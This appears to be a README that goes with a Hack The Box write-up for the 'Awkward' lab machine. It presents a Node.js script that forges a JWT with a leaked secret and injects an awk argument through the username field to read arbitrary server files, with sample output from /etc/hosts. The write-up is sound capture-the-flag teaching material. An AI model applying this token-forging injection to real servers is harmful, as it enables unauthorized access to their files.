# Hack The Box. Machines. Awkward

Machine write-up: https://7rocky.github.io/en/htb/awkward

### `readFile.js`

This script built in Node.js is used to read files from the server exploiting a Local File Read vulnerability. The injection comes into place in a JWT token, where we have control over the `username` field, which is used in an `awk` command.

This is the main function (`readFile`):

```js
const TOKEN_SECRET = '123beany123'
const OPTIONS = { hostname: '10.10.11.185', path: '/api/all-leave' }

const readFile = filename => {
	const token = jwt.sign({ username: `/' ${filename} '` }, TOKEN_SECRET)

	const headers = { Cookie: `token=${token}`, Host: 'hat-valley.htb' }

	const req = http.request({ ...OPTIONS, headers }, res => {
		let body = ''

  	res.on('data', data => (body += data))
  	res.on('end', () => console.log(body))
	})

	req.on('error', console.error)
	req.end()
}
```

The relevant part is the JWT token, which has a malicious `username` field (more informacion in the [write-up](https://7rocky.github.io/en/htb/awkward)). Notice that I enter the domain `hat-valley.htb`, so there is no need to update `/etc/hosts`. The rest is a standard way to perform a GET request with Node.js.

The program takes the first command-line argument as the file to read:

```js
if (process.argv.length !== 3) {
	console.error('Usage: node readFile.js <filename>')
	process.exit(1)
}

readFile(process.argv[2])
```

This is an example of usage:

```console
$ node readFile.js /etc/hosts
127.0.0.1       localhost hat-valley.htb store.hat-valley.htb  
127.0.0.1       awkward

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
